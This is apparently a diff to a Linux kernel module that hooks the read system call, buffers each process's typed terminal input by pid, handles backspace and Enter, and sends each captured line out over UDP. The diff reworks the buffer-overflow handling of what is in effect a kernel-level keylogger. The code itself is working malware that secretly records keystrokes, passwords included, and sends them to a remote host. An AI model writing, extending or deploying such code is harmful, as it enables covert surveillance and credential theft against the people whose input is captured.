@@ -90,28 +90,26 @@ static ssize_t my_read(int fd, void *buf, size_t count){
     cur_tinb = find_tinbuf(current->pid);
 
     for(i = 0; i < retVal; i++){
-      if(cur_tinb->bufpos < INPUTBUFLEN-1){
-        c =  *((char*)buf+i);
-        if(c == 0x7f){ //handle backspace
-          if(cur_tinb->bufpos > 0){ //prevent going further than 0
-            cur_tinb->bufpos = (cur_tinb->bufpos-1) % INPUTBUFLEN;
-            cur_tinb->buf[cur_tinb->bufpos] = '\0';
-          }
-          continue;
-        }
-        if(c == 0x0d){ //handle enter press
-          cur_tinb->buf[cur_tinb->bufpos] = '\0';
-          cur_tinb->bufpos = 0;
-
-          send_udp(cur_tinb->pid ,cur_tinb->buf);
-
-          *cur_tinb->buf = '\0';
-          continue;
-        }
-      }
-      else{
+      if(cur_tinb->bufpos >= INPUTBUFLEN-1){
         send_udp(cur_tinb->pid ,cur_tinb->buf);
         cur_tinb->bufpos = 0;
+      }
+      c =  *((char*)buf+i);
+      if(c == 0x7f){ //handle backspace
+        if(cur_tinb->bufpos > 0){ //prevent going further than 0
+          cur_tinb->bufpos = (cur_tinb->bufpos-1) % INPUTBUFLEN;
+          cur_tinb->buf[cur_tinb->bufpos] = '\0';
+        }
+        continue;
+      }
+      if(c == 0x0d){ //handle enter press
+        cur_tinb->buf[cur_tinb->bufpos] = '\0';
+        cur_tinb->bufpos = 0;
+
+        send_udp(cur_tinb->pid ,cur_tinb->buf);
+
+        *cur_tinb->buf = '\0';
+        continue;
       }
       cur_tinb->buf[cur_tinb->bufpos] = *((char*)buf+i);
       cur_tinb->bufpos++;
